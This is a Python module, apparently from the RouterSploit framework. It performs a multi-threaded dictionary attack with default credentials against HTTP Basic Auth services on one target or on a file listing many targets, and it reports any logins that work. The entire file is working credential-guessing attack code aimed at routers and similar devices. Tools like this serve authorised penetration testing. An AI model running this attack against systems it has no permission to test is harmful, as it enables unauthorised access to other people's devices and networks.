import threading
import requests

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    sanitize_url,
    boolify,
    http_request
)


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against HTTP Basic Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Basic Default Creds',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target port') 
    threads = exploits.Option(8, 'Number of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    path = exploits.Option('/', 'URL Path')
    verbosity = exploits.Option('yes', 'Display authentication attempts')

    credentials = []

    def run(self):
        self.credentials = []

        if self.target.startswith('file://'):
            self.multi_run()
        else:
            self.single_run()
            
    def multi_run(self):
        original_target = self.target
        original_port = self.port

        _, _, feed_path = self.target.partition("file://")
        try:
            file_handler = open(feed_path, 'r')
        except IOError:
            print_error("Could not read file: {}".format(self.target))
            return

        for target in file_handler:
            target = target.strip()
            if not target:
                continue
            self.target, _, port = target.partition(':')
            if port:
                self.port = port
            print_status("Attack against: {}:{}".format(self.target, self.port))
            self.single_run()

        self.target = original_target
        self.port = original_port
        file_handler.close()

    def single_run(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        response = http_request("GET", url)
        if response is None:
            return

        if response.status_code != 401:
            print_status("Target is not protected by Basic Auth")
            return

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

        defaults.close()

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].encode('utf-8').strip()
                password = line[1].encode('utf-8').strip()
                r = requests.get(url, auth=(user, password), verify=False)

                if r.status_code != 401:
                    running.clear()
                    print_success("Target: {}:{} {}: Authentication succeed!".format(self.target, self.port, name), user, password, verbose=module_verbosity)
                    self.credentials.append((self.target, self.port, user, password))
                else:
                    print_error(name, "Target: {}:{} Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, user, password), verbose=module_verbosity)
            except StopIteration:
                break

        print_status(name, 'process is terminated.', verbose=module_verbosity)
